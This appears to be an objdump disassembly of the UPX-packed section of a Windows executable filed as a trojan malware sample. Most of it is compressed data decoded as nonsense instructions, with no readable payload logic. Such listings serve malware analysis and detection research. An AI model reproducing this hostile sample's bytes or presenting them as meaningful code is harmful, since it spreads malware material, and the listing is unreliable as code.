
malware_samples/trojan/68a341b2f3230f1eeedaf00ab452c6666155a403dc5cb947361036f9daafbe25.exe:     file format pei-i386


Disassembly of section UPX1:

00408000 <UPX1>:
  408000:	36 1c de             	ss sbb $0xde,%al
  408003:	c3                   	ret
  408004:	88 de                	mov    %bl,%dh
  408006:	74 00                	je     0x408008
  408008:	00 52 1b             	add    %dl,0x1b(%edx)
  40800b:	00 00                	add    %al,(%eax)
  40800d:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  408011:	26 04 00             	es add $0x0,%al
  408014:	37                   	aaa
  408015:	ff                   	(bad)
  408016:	ff 5f fe             	lcall  *-0x2(%edi)
  408019:	55                   	push   %ebp
  40801a:	89 e5                	mov    %esp,%ebp
  40801c:	81 ec 0c 00 90 8d    	sub    $0x8d90000c,%esp
  408022:	45                   	inc    %ebp
  408023:	f8                   	clc
  408024:	50                   	push   %eax
  408025:	e8 04 00 3e 9c       	call   0x9c7e802e
  40802a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40802d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408030:	29 c8                	sub    %ecx,%eax
  408032:	40                   	inc    %eax
  408033:	89 f6                	mov    %esi,%esi
  408035:	db 2f                	fldt   (%edi)
  408037:	db 45 f4             	fildl  -0xc(%ebp)
  40803a:	0b f8                	or     %eax,%edi
  40803c:	f4                   	hlt
  40803d:	31 d2                	xor    %edx,%edx
  40803f:	f7 f1                	div    %ecx
  408041:	09 08                	or     %ecx,(%eax)
  408043:	01 d0                	add    %edx,%eax
  408045:	c9                   	leave
  408046:	c3                   	ret
  408047:	2f                   	das
  408048:	3e f6 bb 33 00 10 50 	idivb  %ds:0x50100033(%ebx)
  40804f:	b8 34 60 40 00       	mov    $0x406034,%eax
  408054:	35 a4 83 c4 08       	xor    $0x8c483a4,%eax
  408059:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40805a:	64 4a                	fs dec %edx
  40805c:	c6                   	(bad)
  40805d:	11 86 b7 de 25 47    	adc    %eax,0x4725deb7(%esi)
  408063:	72 4a                	jb     0x4080af
  408065:	0f 61 49 32          	punpcklwd 0x32(%ecx),%mm1
  408069:	25 53 32 82 ab       	and    $0xab823253,%eax
  40806e:	e6 29                	out    %al,$0x29
  408070:	39 92 53 14 62 41    	cmp    %edx,0x41621453(%edx)
  408076:	60                   	pusha
  408077:	03 99 92 66 9b f5    	add    -0xa64996e(%ecx),%ebx
  40807d:	ee                   	out    %al,(%dx)
  40807e:	01 fb                	add    %edi,%ebx
  408080:	76 e9                	jbe    0x40806b
  408082:	13 01                	adc    (%ecx),%eax
  408084:	63 b8 c3 1e 04 b8    	arpl   %edi,-0x47fbe13d(%eax)
  40808a:	01 18                	add    %ebx,(%eax)
  40808c:	61                   	popa
  40808d:	7f b1                	jg     0x408040
  40808f:	f6 89 05 88 77 13 0a 	testb  $0xa,0x13778805(%ecx)
  408096:	22 8c b8 00 09 76 ee 	and    -0x1189f700(%eax,%edi,4),%cl
  40809d:	77 b1                	ja     0x408050
  40809f:	04 54                	add    $0x54,%al
  4080a1:	83 f8 02             	cmp    $0x2,%eax
  4080a4:	0f 87 11 15 08 73    	ja     0x734895bb
  4080aa:	bd bf fc 5f de       	mov    $0xde5ffcbf,%ebp
  4080af:	04 00                	add    $0x0,%al
  4080b1:	74 b8                	je     0x40806b
  4080b3:	01 74 b3 eb          	add    %esi,-0x15(%ebx,%esi,4)
  4080b7:	d4 83                	aam    $0x83
  4080b9:	f8                   	clc
  4080ba:	05 74 ac 06 74       	add    $0x7406ac74,%eax
  4080bf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4080c0:	eb c8                	jmp    0x40808a
  4080c2:	fd                   	std
  4080c3:	7d c6                	jge    0x40808b
  4080c5:	da c9                	fcmove %st(1),%st
  4080c7:	c2 2e 6d             	ret    $0x6d2e
  4080ca:	98                   	cwtl
  4080cb:	b8 94 5a 85 68       	mov    $0x68855a94,%eax
  4080d0:	ff                   	ljmp   (bad)
  4080d1:	ee                   	out    %al,(%dx)
  4080d2:	5d                   	pop    %ebp
  4080d3:	2c b6                	sub    $0xb6,%al
  4080d5:	00 8d 05 74 2b 00    	add    %cl,0x2b7405(%ebp)
  4080db:	0f 84 32 1a 46 c6    	je     0xc6869b13
  4080e1:	7e e6                	jle    0x4080c9
  4080e3:	8b 85 78 59 85 16    	mov    0x16855978(%ebp),%eax
  4080e9:	0e                   	push   %cs
  4080ea:	6c                   	insb   (%dx),%es:(%edi)
  4080eb:	05 42 ec 98 59       	add    $0x5998ec42,%eax
  4080f0:	07                   	pop    %es
  4080f1:	8d                   	lea    (bad),%ebp
  4080f2:	eb 05                	jmp    0x4080f9
  4080f4:	8a cb                	mov    %bl,%cl
  4080f6:	c1 b6 61 df fc 88 f4 	shll   $0xf4,-0x7703209f(%esi)
  4080fd:	0c 90                	or     $0x90,%al
  4080ff:	fc                   	cld
  408100:	d6                   	salc
  408101:	ac                   	lods   %ds:(%esi),%al
  408102:	dd dc                	fstp   %st(4)
  408104:	cc                   	int3
  408105:	90                   	nop
  408106:	01 5d 70             	add    %ebx,0x70(%ebp)
  408109:	fe                   	(bad)
  40810a:	b8 02 02 0c 63       	mov    $0x630c0202,%eax
  40810f:	36 d8 63 66          	fsubs  %ss:0x66(%ebx)
  408113:	b4 2b                	mov    $0x2b,%ah
  408115:	0f 94 c0             	sete   %al
  408118:	28 18                	sub    %bl,(%eax)
  40811a:	91                   	xchg   %eax,%ecx
  40811b:	63 5b ec             	arpl   %ebx,-0x14(%ebx)
  40811e:	2c 3f                	sub    $0x3f,%al
  408120:	ec                   	in     (%dx),%al
  408121:	07                   	pop    %es
  408122:	2f                   	das
  408123:	80 05 04 e1 21 23 63 	addb   $0x63,0x2321e104
  40812a:	0b 00                	or     (%eax),%eax
  40812c:	02 c0                	add    %al,%al
  40812e:	50                   	push   %eax
  40812f:	49                   	dec    %ecx
  408130:	9c                   	pushf
  408131:	33 1b                	xor    (%ebx),%ebx
  408133:	df 4b bc             	fisttps -0x44(%ebx)
  408136:	48                   	dec    %eax
  408137:	f8                   	clc
  408138:	35 05 ec 65 67       	xor    $0x6765ec05,%eax
  40813d:	d9 9d ff 0d 96 02    	fstps  0x2960dff(%ebp)
  408143:	d7                   	xlat   %ds:(%ebx)
  408144:	36 db 48 73          	fisttpl %ss:0x73(%eax)
  408148:	b6 3c                	mov    $0x3c,%dh
  40814a:	00 ec                	add    %ch,%ah
  40814c:	c4 08                	les    (%eax),%ecx
  40814e:	0c 6d                	or     $0x6d,%al
  408150:	cc                   	int3
  408151:	1c 23                	sbb    $0x23,%al
  408153:	cc                   	int3
  408154:	8e 1a                	mov    (%edx),%ds
  408156:	a9 f0 d8 36 59       	test   $0x5936d8f0,%eax
  40815b:	d7                   	xlat   %ds:(%ebx)
  40815c:	1e                   	push   %ds
  40815d:	f4                   	hlt
  40815e:	03 0c 26             	add    (%esi,%eiz,1),%ecx
  408161:	d4 1d                	aam    $0x1d
  408163:	e8 0b 9c 4c 58       	call   0x588d1d73
  408168:	79 dc                	jns    0x408146
  40816a:	8b e2                	mov    %edx,%esp
  40816c:	10 f0                	adc    %dh,%al
  40816e:	20 dd                	and    %bl,%ch
  408170:	fb                   	sti
  408171:	ef                   	out    %eax,(%dx)
  408172:	20 e4                	and    %ah,%ah
  408174:	0f b7 85 fc 0c 07 fa 	movzwl -0x5f8f304(%ebp),%eax
  40817b:	83 0c 32 c8          	orl    $0xffffffc8,(%edx,%esi,1)
  40817f:	f8                   	clc
  408180:	f0 f6 f2             	lock div %dl
  408183:	90                   	nop
  408184:	85 c3                	test   %eax,%ebx
  408186:	08 17                	or     %dl,(%edi)
  408188:	f0 f0 82 00 78       	lock lock addb $0x78,(%eax)
  40818d:	d8 6c e1 ec          	fsubrs -0x14(%ecx,%eiz,8)
  408191:	f7 20                	mull   (%eax)
  408193:	0e                   	push   %cs
  408194:	e5 02                	in     $0x2,%eax
  408196:	22 f6                	and    %dh,%dh
  408198:	25 0b c9 29 29       	and    $0x2929c90b,%eax
  40819d:	01 f8                	add    %edi,%eax
  40819f:	b8 03 07 c1 b1       	mov    $0xb1c10703,%eax
  4081a4:	69 36 f0 0f 52 05    	imul   $0x5520ff0,(%esi),%esi
  4081aa:	30 fe                	xor    %bh,%dh
  4081ac:	c2 c6 1c             	ret    $0x1cc6
  4081af:	43                   	inc    %ebx
  4081b0:	18 1e                	sbb    %bl,(%esi)
  4081b2:	06                   	push   %es
  4081b3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4081b4:	05 1b 3d 73 93       	add    $0x93733d1b,%eax
  4081b9:	e0 19                	loopne 0x4081d4
  4081bb:	36 f4                	ss hlt
  4081bd:	c3                   	ret
  4081be:	34 85                	xor    $0x85,%al
  4081c0:	ec                   	in     (%dx),%al
  4081c1:	ef                   	out    %eax,(%dx)
  4081c2:	ac                   	lods   %ds:(%esi),%al
  4081c3:	19 cc                	sbb    %ecx,%esp
  4081c5:	84 0a                	test   %cl,(%edx)
  4081c7:	e8 8b 05 8d 16       	call   0x16cd8757
  4081cc:	d9 67 cf             	fldenv -0x31(%edi)
  4081cf:	f8                   	clc
  4081d0:	39 c8                	cmp    %ecx,%eax
  4081d2:	0f 83 3b 6b 03 db    	jae    0xdb43ed13
  4081d8:	18 89 c1 40 27 4c    	sbb    %cl,0x4c2740c1(%ecx)
  4081de:	ff                   	(bad)
  4081df:	fe                   	(bad)
  4081e0:	ec                   	in     (%dx),%al
  4081e1:	eb d6                	jmp    0x4081b9
  4081e3:	10 c1                	adc    %al,%cl
  4081e5:	e0 02                	loopne 0x4081e9
  4081e7:	8d 8d d8 01 c1 8b    	lea    -0x743efe28(%ebp),%ecx
  4081ed:	01 db                	add    %ebx,%ebx
  4081ef:	16                   	push   %ss
  4081f0:	76 9b                	jbe    0x40818d
  4081f2:	ec                   	in     (%dx),%al
  4081f3:	33 85 05 01 eb ca    	xor    -0x3514fefb(%ebp),%eax
  4081f9:	4e                   	dec    %esi
  4081fa:	b7 3d                	mov    $0x3d,%bh
  4081fc:	47                   	inc    %edi
  4081fd:	36 4a                	ss dec %edx
  4081ff:	34 ec                	xor    $0xec,%al
  408201:	fe 40 5d             	incb   0x5d(%eax)
  408204:	25 0e d8 ec 96       	and    $0x96ecd80e,%eax
  408209:	b2 47                	mov    $0x47,%dl
  40820b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40820c:	89 01                	mov    %eax,(%ecx)
  40820e:	24 6e                	and    $0x6e,%al
  408210:	ec                   	in     (%dx),%al
  408211:	40                   	inc    %eax
  408212:	38 bc 08 97 c2 8d 15 	cmp    %bh,0x158dc297(%eax,%ecx,1)
  408219:	d8 84 2f 58 0c d1 fc 	fadds  -0x32ef3a8(%edi,%ebp,1)
  408220:	95                   	xchg   %eax,%ebp
  408221:	fb                   	sti
  408222:	66 66 f9             	data16 data16 stc
  408225:	de 4a 55             	fimuls 0x55(%edx)
  408228:	0b ff                	or     %edi,%edi
  40822a:	3e 2c 48             	ds sub $0x48,%al
  40822d:	32 c2                	xor    %dl,%al
  40822f:	c3                   	ret
  408230:	fc                   	cld
  408231:	3f                   	aas
  408232:	04 20                	add    $0x20,%al
  408234:	25 93 31 d9 59       	and    $0x59d93193,%eax
  408239:	ef                   	out    %eax,(%dx)
  40823a:	10 1f                	adc    %bl,(%edi)
  40823c:	0c 9f                	or     $0x9f,%al
  40823e:	9f                   	lahf
  40823f:	82 0c d6 8c          	orb    $0x8c,(%esi,%edx,8)
  408243:	c0 5e 9b 24          	rcrb   $0x24,-0x65(%esi)
  408247:	c8 20 18 c6          	enter  $0x1820,$0xc6
  40824b:	3f                   	aas
  40824c:	69 88 77 ec 36 46 fb 	imul   $0x18ca0cfb,0x4636ec77(%eax),%ecx
  408253:	0c ca 18 
  408256:	63 0d 34 e8 54 b1    	arpl   %ecx,0xb154e834
  40825c:	65 33 4c 14 c2       	xor    %gs:-0x3e(%esp,%edx,1),%ecx
  408261:	12 e4                	adc    %ah,%ah
  408263:	e4 26                	in     $0x26,%al
  408265:	fb                   	sti
  408266:	da 3b                	fidivrl (%ebx)
  408268:	08 22                	or     %ah,(%edx)
  40826a:	05 2c ec 13 0a       	add    $0xa13ec2c,%eax
  40826f:	3d 2e 77 61 21       	cmp    $0x2161772e,%eax
  408274:	c6                   	(bad)
  408275:	8d 46 e4             	lea    -0x1c(%esi),%eax
  408278:	05 89 4d 2c 76       	add    $0x762c4d89,%eax
  40827d:	07                   	pop    %es
  40827e:	3b 8c 9e ec 6a e0 8b 	cmp    -0x741f9514(%esi,%ebx,4),%ecx
  408285:	02 4d ec             	add    -0x14(%ebp),%cl
  408288:	1d dc 60 1b 4a       	sbb    $0x4a1b60dc,%eax
  40828d:	8d 53 42             	lea    0x42(%ebx),%edx
  408290:	6f                   	outsl  %ds:(%esi),(%dx)
  408291:	12 27                	adc    (%edi),%ah
  408293:	2c db                	sub    $0xdb,%al
  408295:	df bb 05 eb e2 1d    	fistpll 0x1de2eb05(%ebx)
  40829b:	3c 0f                	cmp    $0xf,%al
  40829d:	be 01 66 0d 19       	mov    $0x190d6601,%esi
  4082a2:	b0 cb                	mov    $0xcb,%al
  4082a4:	26 cc                	es int3
  4082a6:	13 0a                	adc    (%edx),%ecx
  4082a8:	7a b0                	jp     0x40825a
  4082aa:	18 3b                	sbb    %bh,(%ebx)
  4082ac:	f6 ef                	imul   %bh
  4082ae:	d8 5a 88             	fcomps -0x78(%edx)
  4082b1:	01 13                	add    %edx,(%ebx)
  4082b3:	b2 eb                	mov    $0xeb,%dl
  4082b5:	b2 8b                	mov    $0x8b,%dl
  4082b7:	8d 06                	lea    (%esi),%eax
  4082b9:	52                   	push   %edx
  4082ba:	04 4b                	add    $0x4b,%al
  4082bc:	36 64 ef             	ss fs out %eax,(%dx)
  4082bf:	3a bd 81 dc 13 87    	cmp    -0x78ec237f(%ebp),%bh
  4082c5:	1d 59 2e 79 dc       	sbb    $0xdc792e59,%eax
  4082ca:	39 c1                	cmp    %eax,%ecx
  4082cc:	f7 dc                	neg    %esp
  4082ce:	dc eb                	fsubr  %st,%st(3)
  4082d0:	d9 1b                	fstps  (%ebx)
  4082d2:	c9                   	leave
  4082d3:	d6                   	salc
  4082d4:	23 dc                	and    %esp,%ebx
  4082d6:	87 08                	xchg   %ecx,(%eax)
  4082d8:	13 87 e5 65 c3 4e    	adc    0x4ec365e5(%edi),%eax
  4082de:	06                   	push   %es
  4082df:	38 18                	cmp    %bl,(%eax)
  4082e1:	87 06                	xchg   %eax,(%esi)
  4082e3:	3a 5a 72             	cmp    0x72(%edx),%bl
  4082e6:	ac                   	lods   %ds:(%esi),%al
  4082e7:	59                   	pop    %ecx
  4082e8:	fa                   	cli
  4082e9:	5a                   	pop    %edx
  4082ea:	06                   	push   %es
  4082eb:	4f                   	dec    %edi
  4082ec:	cc                   	int3
  4082ed:	8f c9 43 07          	(bad)
  4082f1:	08 08                	or     %cl,(%eax)
  4082f3:	b7 04                	mov    $0x4,%bh
  4082f5:	f8                   	clc
  4082f6:	be c7 5e d8 19       	mov    $0x19d85ec7,%esi
  4082fb:	8b 49 8d             	mov    -0x73(%ecx),%ecx
  4082fe:	f8                   	clc
  4082ff:	fb                   	sti
  408300:	0a 83 c0 04 0d f4    	or     -0xbf2fb40(%ebx),%al
  408306:	30 9e 0f 4c 4e 3f    	xor    %bl,0x3f4e4c0f(%esi)
  40830c:	1c c8                	sbb    $0xc8,%al
  40830e:	41                   	inc    %ecx
  40830f:	dc cb                	fmul   %st,%st(3)
  408311:	98                   	cwtl
  408312:	3b 2c 1d 1a 24 0c b8 	cmp    -0x47f3dbe6(,%ebx,1),%ebp
  408319:	ff 00                	incl   (%eax)
  40831b:	97                   	xchg   %eax,%edi
  40831c:	cc                   	int3
  40831d:	82 db 4a             	sbb    $0x4a,%bl
  408320:	28 13                	sub    %dl,(%ebx)
  408322:	cd 08                	int    $0x8
  408324:	19 20                	sbb    %esp,(%eax)
  408326:	fb                   	sti
  408327:	63 23                	arpl   %esp,(%ebx)
  408329:	df 24 24             	fbld   (%esp)
  40832c:	0a 01                	or     (%ecx),%al
  40832e:	1c 15                	sbb    $0x15,%al
  408330:	02 ac 03 39 60 47 1c 	add    0x1c476039(%ebx,%eax,1),%ch
  408337:	f9                   	stc
  408338:	00 b0 2c d8 b7 64    	add    %dh,0x64b7d82c(%eax)
  40833e:	01 19                	add    %ebx,(%ecx)
  408340:	2c 59                	sub    $0x59,%al
  408342:	05 03 db 35 46       	add    $0x4635db03,%eax
  408347:	97                   	xchg   %eax,%edi
  408348:	78 d8                	js     0x408322
  40834a:	b8 10 8e 75 ef       	mov    $0xef758e10,%eax
  40834f:	97                   	xchg   %eax,%edi
  408350:	b0 0c                	mov    $0xc,%al
  408352:	46                   	inc    %esi
  408353:	3a 66 89             	cmp    -0x77(%esi),%ah
  408356:	14 35                	adc    $0x35,%al
  408358:	f8                   	clc
  408359:	f6 8b 6c 87 a9 34 11 	testb  $0x11,0x34a9876c(%ebx)
  408360:	10 d9                	adc    %bl,%cl
  408362:	81 e0 03 d8 6e 6b    	and    $0x6b6ed803,%eax
  408368:	b0 5f                	mov    $0x5f,%al
  40836a:	3c 4d                	cmp    $0x4d,%al
  40836c:	c0 2d 0e f9 a6 36 fb 	shrb   $0xfb,0x36a6f90e
  408373:	9f                   	lahf
  408374:	4b                   	dec    %ebx
  408375:	9a 38 b8 7e 66 04 80 	lcall  $0x8004,$0x667eb838
  40837c:	50                   	push   %eax
  40837d:	7b 2d                	jnp    0x4083ac
  40837f:	6c                   	insb   (%dx),%es:(%edi)
  408380:	d9 39                	fnstcw (%ecx)
  408382:	36 44                	ss inc %esp
  408384:	81 f6 03 7b 21 27    	xor    $0x27217b03,%esi
  40838a:	e1 90                	loope  0x40831c
  40838c:	0e                   	push   %cs
  40838d:	4c                   	dec    %esp
  40838e:	4d                   	dec    %ebp
  40838f:	ff a7 08 d4 ac 57    	jmp    *0x57acd408(%edi)
  408395:	d3 7f 18             	sarl   %cl,0x18(%edi)
  408398:	54                   	push   %esp
  408399:	81 f8 33 27 19 85    	cmp    $0x85192733,%eax
  40839f:	7a 41                	jp     0x4083e2
  4083a1:	3e 9f                	ds lahf
  4083a3:	93                   	xchg   %eax,%ebx
  4083a4:	1c 08                	sbb    $0x8,%al
  4083a6:	f8                   	clc
  4083a7:	00 f8                	add    %bh,%al
  4083a9:	00 f8                	add    %bh,%al
  4083ab:	08 f8                	or     %bh,%al
  4083ad:	58                   	pop    %eax
  4083ae:	b3 c1                	mov    $0xc1,%bl
  4083b0:	4e                   	dec    %esi
  4083b1:	3e 3f                	ds aas
  4083b3:	1d 18 41 41 0e       	sbb    $0xe414118,%eax
  4083b8:	f2 e4 00             	repnz in $0x0,%al
  4083bb:	f8                   	clc
  4083bc:	00 f8                	add    %bh,%al
  4083be:	0c f8                	or     $0xf8,%al
  4083c0:	c2 3e 60             	ret    $0x603e
  4083c3:	bd 8d 83 44 08       	mov    $0x844838d,%ebp
  4083c8:	45                   	inc    %ebp
  4083c9:	eb c7                	jmp    0x408392
  4083cb:	51                   	push   %ecx
  4083cc:	19 e4                	sbb    %esp,%esp
  4083ce:	c8 d6 44 37          	enter  $0x44d6,$0x37
  4083d2:	08 f8                	or     %bh,%al
  4083d4:	28 f6                	sub    %dh,%dh
  4083d6:	15 4b d9 4a cc       	adc    $0xcc4ad94b,%eax
  4083db:	47                   	inc    %edi
  4083dc:	08 74 92 10          	or     %dh,0x10(%edx,%edx,4)
  4083e0:	e1 1b                	loope  0x4083fd
  4083e2:	08 8d d5 73 78 21    	or     %cl,0x217873d5(%ebp)
  4083e8:	6b f6 12             	imul   $0x12,%esi,%esi
  4083eb:	0c 4a                	or     $0x4a,%al
  4083ed:	1a c1                	sbb    %cl,%al
  4083ef:	70 d6                	jo     0x4083c7
  4083f1:	42                   	inc    %edx
  4083f2:	12 35 c1 97 8f 7e    	adc    0x7e8f97c1,%dh
  4083f8:	3f                   	aas
  4083f9:	d6                   	salc
  4083fa:	3e c1 e8 18          	ds shr $0x18,%eax
  4083fe:	91                   	xchg   %eax,%ecx
  4083ff:	08 e9                	or     %ch,%cl
  408401:	10 81 e1 ff 83 95    	adc    %al,-0x6a7c001f(%ecx)
  408407:	f8                   	clc
  408408:	2e cc                	cs int3
  40840a:	7e 1e                	jle    0x40842a
  40840c:	95                   	xchg   %eax,%ebp
  40840d:	e2 c1                	loop   0x4083d0
  40840f:	fa                   	cli
  408410:	08 08                	or     %cl,(%eax)
  408412:	b0 fc                	mov    $0xfc,%al
  408414:	f7 81 f7 37 79 f8 63 	testl  $0x8b515263,-0x786c809(%ecx)
  40841b:	52 51 8b 
  40841e:	14 fa                	adc    $0xfa,%al
  408420:	89 2f                	mov    %ebp,(%edi)
  408422:	39 b2 21 63 1c f9    	cmp    %esi,-0x6e39cdf(%edx)
  408428:	18 b8 68 ec d6 dc    	sbb    %bh,-0x23291398(%eax)
  40842e:	c6                   	(bad)
  40842f:	98                   	cwtl
  408430:	71 5c                	jno    0x40848e
  408432:	88 ac 0b b9 06 32 dd 	mov    %ch,-0x22cdf947(%ebx,%ecx,1)
  408439:	bb 2c 17 64 aa       	mov    $0xaa64172c,%ebx
  40843e:	58                   	pop    %eax
  40843f:	f8                   	clc
  408440:	09 b3 0e d9 79 04    	or     %esi,0x479d90e(%ebx)
  408446:	06                   	push   %es
  408447:	90                   	nop
  408448:	fc                   	cld
  408449:	c2 1e 93             	ret    $0x931e
  40844c:	52                   	push   %edx
  40844d:	04 fe                	add    $0xfe,%al
  40844f:	e0 06                	loopne 0x408457
  408451:	36 c9                	ss leave
  408453:	71 03                	jno    0x408458
  408455:	4c                   	dec    %esp
  408456:	76 4b                	jbe    0x4084a3
  408458:	82 2f c9             	subb   $0xc9,(%edi)
  40845b:	8d                   	lea    (bad),%eax
  40845c:	c5 10                	lds    (%eax),%edx
  40845e:	5f                   	pop    %edi
  40845f:	7a 36                	jp     0x408497
  408461:	34 04                	xor    $0x4,%al
  408463:	c8 b3 62 c1          	enter  $0x62b3,$0xc1
  408467:	4c                   	dec    %esp
  408468:	4f                   	dec    %edi
  408469:	83 05 13 19 b1 c9 0b 	addl   $0xb,0xc9b11913
  408470:	90                   	nop
  408471:	06                   	push   %es
  408472:	0f 8f 14 a9 e1 b2    	jg     0xb3222d8c
  408478:	f8                   	clc
  408479:	b0 e3                	mov    $0xe3,%al
  40847b:	b8 2d 63 dc 10       	mov    $0x10dc632d,%eax
  408480:	dd 1d c9 05 b6 0a    	fstpl  0xab605c9
  408486:	44                   	inc    %esp
  408487:	27                   	daa
  408488:	4c                   	dec    %esp
  408489:	65 20 0c c8          	and    %cl,%gs:(%eax,%ecx,8)
  40848d:	90                   	nop
  40848e:	20 60 0c             	and    %ah,0xc(%eax)
  408491:	1a 13                	sbb    (%ebx),%dl
  408493:	96                   	xchg   %eax,%esi
  408494:	b0 2f                	mov    $0x2f,%al
  408496:	2b a7 bf 36 81 0f    	sub    0xf8136bf(%edi),%esp
  40849c:	59                   	pop    %ecx
  40849d:	08 21                	or     %ah,(%ecx)
  40849f:	46                   	inc    %esi
  4084a0:	00 df                	add    %bl,%bh
  4084a2:	00 06                	add    %al,(%esi)
  4084a4:	32 60 3d             	xor    0x3d(%eax),%ah
  4084a7:	04 27                	add    $0x27,%al
  4084a9:	fc                   	cld
  4084aa:	5d                   	pop    %ebp
  4084ab:	c2 1b 10             	ret    $0x101b
  4084ae:	70 66                	jo     0x408516
  4084b0:	e6 1f                	out    %al,$0x1f
  4084b2:	2f                   	das
  4084b3:	4b                   	dec    %ebx
  4084b4:	9e                   	sahf
  4084b5:	30 85 f5 9f e6 fc    	xor    %al,-0x319600b(%ebp)
  4084bb:	fb                   	sti
  4084bc:	57                   	push   %edi
  4084bd:	32 64 bb 14          	xor    0x14(%ebx,%edi,4),%ah
  4084c1:	a8 0b                	test   $0xb,%al
  4084c3:	41                   	inc    %ecx
  4084c4:	27                   	daa
  4084c5:	b4 10                	mov    $0x10,%ah
  4084c7:	02 c8                	add    %al,%cl
  4084c9:	90                   	nop
  4084ca:	3c 69                	cmp    $0x69,%al
  4084cc:	c9                   	leave
  4084cd:	98                   	cwtl
  4084ce:	2d 58 c0 f3 19       	sub    $0x19f3c058,%eax
  4084d3:	a9 0c 61 04 2c       	test   $0x2c04610c,%eax
  4084d8:	59                   	pop    %ecx
  4084d9:	3f                   	aas
  4084da:	ed                   	in     (%dx),%eax
  4084db:	62 41 6e             	bound  %eax,0x6e(%ecx)
  4084de:	6f                   	outsl  %ds:(%esi),(%dx)
  4084df:	32 b0 06 db a8 77    	xor    0x77a8db06(%eax),%dh
  4084e5:	15 2b 9d 9d 0f       	adc    $0xf9d9d2b,%eax
  4084ea:	0e                   	push   %cs
  4084eb:	c0 3d 08 84 c3 b6 81 	sarb   $0x81,0xb6c38408
  4084f2:	d9 1a                	fstps  (%edx)
  4084f4:	c4 42 6c             	les    0x6c(%edx),%eax
  4084f7:	46                   	inc    %esi
  4084f8:	a3 d8 65 0c 66       	mov    %eax,0x660c65d8
  4084fd:	74 2e                	je     0x40852d
  4084ff:	72 f0                	jb     0x4084f1
  408501:	b5 84                	mov    $0x84,%ch
  408503:	26 04 e0             	es add $0xe0,%al
  408506:	59                   	pop    %ecx
  408507:	0c b5                	or     $0xb5,%al
  408509:	96                   	xchg   %eax,%esi
  40850a:	91                   	xchg   %eax,%ecx
  40850b:	6f                   	outsl  %ds:(%esi),(%dx)
  40850c:	15 01 0f 8e 22       	adc    $0x228e0f01,%eax
  408511:	08 fc                	or     %bh,%ah
  408513:	be db b1 06 0b       	mov    $0xb06b1db,%esi
  408518:	47                   	inc    %edi
  408519:	d1 f1                	shl    $1,%ecx
  40851b:	19 e8                	sbb    %ebp,%eax
  40851d:	02 22                	add    (%edx),%ah
  40851f:	0c 7d                	or     $0x7d,%al
  408521:	ef                   	out    %eax,(%dx)
  408522:	2e 02 c3             	cs add %bl,%al
  408525:	08 08                	or     %cl,(%eax)
  408527:	eb d2                	jmp    0x4084fb
  408529:	13 92 0e dc d2 21    	adc    0x21d2dc0e(%edx),%edx
  40852f:	97                   	xchg   %eax,%edi
  408530:	2d b6 fc 85 10       	sub    $0x1085fcb6,%eax
  408535:	10 31                	adc    %dh,(%ecx)
  408537:	ec                   	in     (%dx),%al
  408538:	dc 9a 7f ff 5b 01    	fcompl 0x15bff7f(%edx)
  40853e:	c8 13 10 04          	enter  $0x1013,$0x4
  408542:	c6                   	(bad)
  408543:	3a 41 c3             	cmp    -0x3d(%ecx),%al
  408546:	f0 28 0f             	lock sub %cl,(%edi)
  408549:	1e                   	push   %ds
  40854a:	d8 60 38             	fsubs  0x38(%eax)
  40854d:	2c 89                	sub    $0x89,%al
  40854f:	b8 45 72 b1 07       	mov    $0x7b17245,%eax
  408554:	02 bb 45 b0 35 63    	add    0x6335b045(%ebx),%bh
  40855a:	49                   	dec    %ecx
  40855b:	45                   	inc    %ebp
  40855c:	ea e7 63 d4 0d 83 66 	ljmp   $0x6683,$0xdd463e7
  408563:	f6 08 ee             	testb  $0xee,(%eax)
  408566:	90                   	nop
  408567:	88 77 d8             	mov    %dh,-0x28(%edi)
  40856a:	58                   	pop    %eax
  40856b:	43                   	inc    %ebx
  40856c:	6c                   	insb   (%dx),%es:(%edi)
  40856d:	06                   	push   %es
  40856e:	07                   	pop    %es
  40856f:	f1                   	int1
  408570:	18 f2                	sbb    %dh,%dl
  408572:	a0 a2 b9 18 2b       	mov    0x2b18b9a2,%al
  408577:	ce                   	into
  408578:	14 2c                	adc    $0x2c,%al
  40857a:	3d 85 32 76 d7       	cmp    $0xd7763285,%eax
  40857f:	4c                   	dec    %esp
  408580:	13 d4                	adc    %esp,%edx
  408582:	b8 50 24 e0 1b       	mov    $0x1be02450,%eax
  408587:	59                   	pop    %ecx
  408588:	68 22 61 58 a2       	push   $0xa2586122
  40858d:	f4                   	hlt
  40858e:	6d                   	insl   (%dx),%es:(%edi)
  40858f:	5c                   	pop    %esp
  408590:	ef                   	out    %eax,(%dx)
  408591:	43                   	inc    %ebx
  408592:	16                   	push   %ss
  408593:	da 2d 58 60 88 05    	fisubrl 0x5886058
  408599:	64 0a cb             	fs or  %bl,%cl
  40859c:	0e                   	push   %cs
  40859d:	9d                   	popf
  40859e:	91                   	xchg   %eax,%ecx
  40859f:	06                   	push   %es
  4085a0:	65 b6 39             	gs mov $0x39,%dh
  4085a3:	24 9a                	and    $0x9a,%al
  4085a5:	ce                   	into
  4085a6:	6c                   	insb   (%dx),%es:(%edi)
  4085a7:	2a 66 5e             	sub    0x5e(%esi),%ah
  4085aa:	18 d6                	sbb    %dl,%dh
  4085ac:	8b cb                	mov    %ebx,%ecx
  4085ae:	b6 7b                	mov    $0x7b,%dh
  4085b0:	30 26                	xor    %ah,(%esi)
  4085b2:	66 e1 8b             	data16 loope 0x408540
  4085b5:	75 48                	jne    0x4085ff
  4085b7:	d8 22                	fsubs  (%edx)
  4085b9:	7c d8                	jl     0x408593
  4085bb:	61                   	popa
  4085bc:	92                   	xchg   %eax,%edx
  4085bd:	e6 08                	out    %al,$0x8
  4085bf:	e4 b8                	in     $0xb8,%al
  4085c1:	0c b4                	or     $0xb4,%al
  4085c3:	87 c7                	xchg   %eax,%edi
  4085c5:	64 f1                	fs int1
  4085c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085c8:	8a 7c c6 5f          	mov    0x5f(%esi,%eax,8),%bh
  4085cc:	f6 4e f6 df          	testb  $0xdf,-0xa(%esi)
  4085d0:	0c b9                	or     $0xb9,%al
  4085d2:	63 51 8d             	arpl   %edx,-0x73(%ecx)
  4085d5:	4d                   	dec    %ebp
